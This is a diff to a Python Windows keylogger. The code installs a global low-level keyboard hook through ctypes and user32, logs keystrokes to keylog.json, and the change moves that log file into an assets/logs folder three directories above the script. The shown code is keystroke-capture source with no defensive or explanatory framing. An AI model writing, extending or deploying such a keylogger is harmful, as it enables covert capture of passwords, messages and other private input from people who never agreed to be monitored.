@@ -1,5 +1,6 @@
 import ctypes
 import json
+import os
 from ctypes import wintypes
 
 user32 = ctypes.WinDLL("user32", use_last_error=True)
@@ -21,8 +22,17 @@ user32.CallNextHookEx.argtypes = (
 )
 user32.CallNextHookEx.restype = LRESULT
 
+# ---------------- PATH FIX ----------------
+BASE_DIR = os.path.abspath(
+    os.path.join(os.path.dirname(__file__), "../../../")
+)
+LOG_DIR = os.path.join(BASE_DIR, "assets", "logs")
+os.makedirs(LOG_DIR, exist_ok=True)
+
+log_file = os.path.join(LOG_DIR, "keylog.json")
+# ------------------------------------------
+
 buffer = ""
-log_file = "keylog.json"
 keyboard_callback = None
 hook = None
 
@@ -68,7 +78,6 @@ def keyboard_proc(nCode, wParam, lParam):
 def start_keyboard_logger():
     global keyboard_callback, hook
 
-    # MUST keep global reference
     keyboard_callback = keyboard_proc
 
     hook = user32.SetWindowsHookExW(
@@ -80,7 +89,7 @@ def start_keyboard_logger():
     if not hook:
         raise RuntimeError("Hook installation failed")
 
-    print("[+] Keyboard hook installed. Start typing...")
+    print(f"[+] Keyboard hook installed | Logging to: {log_file}")
 
     try:
         msg = wintypes.MSG()
@@ -90,7 +99,6 @@ def start_keyboard_logger():
     finally:
         if hook:
             user32.UnhookWindowsHookEx(hook)
-            hook = None
         print("[+] Keyboard hook removed")
 
 
